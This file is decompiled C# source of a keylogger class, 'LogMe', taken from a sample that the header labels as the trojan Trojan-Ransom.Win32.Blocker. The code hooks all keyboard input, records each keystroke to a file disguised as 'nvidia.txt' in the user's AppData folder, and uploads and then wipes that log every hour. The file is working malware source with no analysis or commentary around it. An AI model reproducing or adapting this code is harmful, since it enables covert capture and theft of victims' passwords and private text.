// Decompiled with JetBrains decompiler
// Type: PHP_Bot.LogMe
// Assembly: PHP Bot, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4A73DBBE-CCD6-4C8A-915B-72A41BF05981
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00015-msil\Trojan-Ransom.Win32.Blocker.dfxz-5587203fc5e9b0dd6b0d3d299a783862a2204a5dd7f175fb859be97a0e6568ae.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Timers;
using System.Windows.Forms;

namespace PHP_Bot
{
  internal class LogMe
  {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 256;
    private static LogMe.LowLevelKeyboardProc _proc = new LogMe.LowLevelKeyboardProc(LogMe.HookCallback);
    private static IntPtr _hookID = IntPtr.Zero;
    public static string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "nvidia.txt");
    public static byte caps = 0;
    public static byte shift = 0;
    public static byte failed = 0;
    private static string window = "";

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(
      int idHook,
      LogMe.LowLevelKeyboardProc lpfn,
      IntPtr hMod,
      uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(
      IntPtr hhk,
      int nCode,
      IntPtr wParam,
      IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    public static void k()
    {
      LogMe._hookID = LogMe.SetHook(LogMe._proc);
      System.Timers.Timer timer = new System.Timers.Timer();
      timer.Elapsed += new ElapsedEventHandler(LogMe.OnTimedEvent);
      timer.AutoReset = true;
      timer.Interval = 3600000.0;
      timer.Start();
      GC.KeepAlive((object) timer);
    }

    [DllImport("user32.dll")]
    private static extern int GetForegroundWindow();

    [DllImport("user32.dll")]
    private static extern int GetWindowText(int hWnd, StringBuilder text, int count);

    public static string GetActiveWindow()
    {
      StringBuilder text = new StringBuilder(256);
      return LogMe.GetWindowText(LogMe.GetForegroundWindow(), text, 256) > 0 ? text.ToString() : "could not find title.";
    }

    public static void OnTimedEvent(object source, EventArgs e)
    {
      Methods.UploadFile(LogMe.path);
      try
      {
        File.Delete(LogMe.path);
        File.Create(LogMe.path);
      }
      catch
      {
        try
        {
          File.Delete(LogMe.path);
          File.Create(LogMe.path);
        }
        catch
        {
          try
          {
            File.Delete(LogMe.path);
            File.Create(LogMe.path);
          }
          catch
          {
            try
            {
              File.Delete(LogMe.path);
              File.Create(LogMe.path);
            }
            catch
            {
            }
          }
        }
      }
    }

    private static IntPtr SetHook(LogMe.LowLevelKeyboardProc proc)
    {
      using (Process currentProcess = Process.GetCurrentProcess())
      {
        using (ProcessModule mainModule = currentProcess.MainModule)
          return LogMe.SetWindowsHookEx(13, proc, LogMe.GetModuleHandle(mainModule.ModuleName), 0U);
      }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
      try
      {
        if (nCode >= 0 && wParam == (IntPtr) 256)
        {
          StreamWriter streamWriter = File.AppendText(LogMe.path);
          int num = Marshal.ReadInt32(lParam);
          if (Keys.Shift == Control.ModifierKeys)
            LogMe.shift = (byte) 1;
          switch ((Keys) num)
          {
            case Keys.Back:
              streamWriter.Write("back");
              break;
            case Keys.Tab:
              streamWriter.Write("TAB");
              break;
            case Keys.Return:
              streamWriter.WriteLine("");
              break;
            case Keys.Capital:
              LogMe.caps = LogMe.caps != (byte) 0 ? (byte) 0 : (byte) 1;
              break;
            case Keys.Space:
              streamWriter.Write(" ");
              break;
            case Keys.D0:
              if (LogMe.shift == (byte) 0)
              {
                streamWriter.Write("0");
                break;
              }
              streamWriter.Write(")");
              break;
            case Keys.D1:
              if (LogMe.shift == (byte) 0)
              {
                streamWriter.Write("1");
                break;
              }
              streamWriter.Write("!");
              break;
            case Keys.D2:
              if (LogMe.shift == (byte) 0)
              {
                streamWriter.Write("2");
                break;
              }
              streamWriter.Write("@");
              break;
            case Keys.D3:
              if (LogMe.shift == (byte) 0)
              {
                streamWriter.Write("3");
                break;
              }
              streamWriter.Write("#");
              break;
            case Keys.D4:
              if (LogMe.shift == (byte) 0)
              {
                streamWriter.Write("4");
                break;
              }
              streamWriter.Write("$");
              break;
            case Keys.D5:
              if (LogMe.shift == (byte) 0)
              {
                streamWriter.Write("5");
                break;
              }
              streamWriter.Write("%");
              break;
            case Keys.D6:
              if (LogMe.shift == (byte) 0)
              {
                streamWriter.Write("6");
                break;
              }
              streamWriter.Write("^");
              break;
            case Keys.D7:
              if (LogMe.shift == (byte) 0)
              {
                streamWriter.Write("7");
                break;
              }
              streamWriter.Write("&");
              break;
            case Keys.D8:
              if (LogMe.shift == (byte) 0)
              {
                streamWriter.Write("8");
                break;
              }
              streamWriter.Write("*");
              break;
            case Keys.D9:
              if (LogMe.shift == (byte) 0)
              {
                streamWriter.Write("9");
                break;
              }
              streamWriter.Write("(");
              break;
            case Keys.LWin:
            case Keys.RWin:
            case Keys.Apps:
            case Keys.LShiftKey:
            case Keys.RShiftKey:
            case Keys.LControlKey:
            case Keys.RControlKey:
            case Keys.LMenu:
            case Keys.RMenu:
              streamWriter.Write("");
              break;
            case Keys.OemSemicolon:
              if (LogMe.shift == (byte) 0)
              {
                streamWriter.Write(";");
                break;
              }
              streamWriter.Write(":");
              break;
            case Keys.Oemplus:
              if (LogMe.shift == (byte) 0)
              {
                streamWriter.Write("=");
                break;
              }
              streamWriter.Write("+");
              break;
            case Keys.Oemcomma:
              if (LogMe.shift == (byte) 0)
              {
                streamWriter.Write(",");
                break;
              }
              streamWriter.Write("<");
              break;
            case Keys.OemMinus:
              if (LogMe.shift == (byte) 0)
              {
                streamWriter.Write("-");
                break;
              }
              streamWriter.Write("_");
              break;
            case Keys.OemPeriod:
              if (LogMe.shift == (byte) 0)
              {
                streamWriter.Write(".");
                break;
              }
              streamWriter.Write(">");
              break;
            case Keys.OemQuestion:
              if (LogMe.shift == (byte) 0)
              {
                streamWriter.Write("/");
                break;
              }
              streamWriter.Write("?");
              break;
            case Keys.Oemtilde:
              if (LogMe.shift == (byte) 0)
              {
                streamWriter.Write("`");
                break;
              }
              streamWriter.Write("~");
              break;
            case Keys.OemOpenBrackets:
              if (LogMe.shift == (byte) 0)
              {
                streamWriter.Write("[");
                break;
              }
              streamWriter.Write("{");
              break;
            case Keys.OemPipe:
              streamWriter.Write("|");
              break;
            case Keys.OemCloseBrackets:
              if (LogMe.shift == (byte) 0)
              {
                streamWriter.Write("]");
                break;
              }
              streamWriter.Write("}");
              break;
            case Keys.OemQuotes:
              if (LogMe.shift == (byte) 0)
              {
                streamWriter.Write("'");
                break;
              }
              streamWriter.Write('"');
              break;
            default:
              if (LogMe.shift == (byte) 0 && LogMe.caps == (byte) 0)
                streamWriter.Write(((Keys) num).ToString().ToLower());
              if (LogMe.shift == (byte) 1 && LogMe.caps == (byte) 0)
                streamWriter.Write(((Keys) num).ToString().ToUpper());
              if (LogMe.shift == (byte) 0 && LogMe.caps == (byte) 1)
                streamWriter.Write(((Keys) num).ToString().ToUpper());
              if (LogMe.shift == (byte) 1 && LogMe.caps == (byte) 1)
              {
                streamWriter.Write(((Keys) num).ToString().ToLower());
                break;
              }
              break;
          }
          LogMe.shift = (byte) 0;
          streamWriter.Close();
        }
      }
      catch
      {
      }
      return LogMe.CallNextHookEx(LogMe._hookID, nCode, wParam, lParam);
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
  }
}
